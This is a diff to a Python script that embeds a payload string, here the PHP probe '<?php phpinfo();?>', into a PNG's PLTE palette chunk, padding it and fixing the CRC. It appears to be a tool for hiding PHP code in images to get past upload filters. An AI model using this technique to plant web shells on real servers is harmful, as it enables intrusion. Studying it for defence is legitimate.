@@ -33,6 +33,7 @@ class PNG(object):
         except:
             err_msg = "open {f} failed".format(f=fname)
             raise PNGError(err_msg)
+            
         self.read_info()
 
     def read_info(self):
@@ -95,12 +96,15 @@ class PNG(object):
                 im[crc_pos+i] = crc_checks[i]
             self.im = ''.join(im)
         else:
-            code_len = len(self.payload)
-            plte_len = ('%08x' % code_len).decode('hex')
+            code_len = len(self.payload)            # must be a multiple of 3
+            add_len = code_len % 3
+            if add_len:
+                add_len = 3 - add_len
+                
+            plte_len = ('%08x' % (code_len+add_len)).decode('hex')
             plte_type = 'PLTE'
-            plte_data = self.payload
-            plte_crc = self.crc(plte_type+plte_data)
-            plte_crc = plte_crc.decode('hex')
+            plte_data = self.payload + ' ' * add_len
+            plte_crc = self.crc(plte_type+plte_data).decode('hex')
             plte_chunk = plte_len + plte_type + plte_data + plte_crc
 
             im = self.data[:self.plte_pos]
@@ -115,8 +119,10 @@ class PNG(object):
 if __name__ == "__main__":
     debug = 0
     if debug:
-        php_code = '<?php phpinfo();?>'
-        php_png = 'php.png'
+        info_code = '<?php phpinfo();?>'
+
+        php_code = info_code
+        php_png = 'php_long.png'
         png_file = 'test.png'
     else:
         import argparse
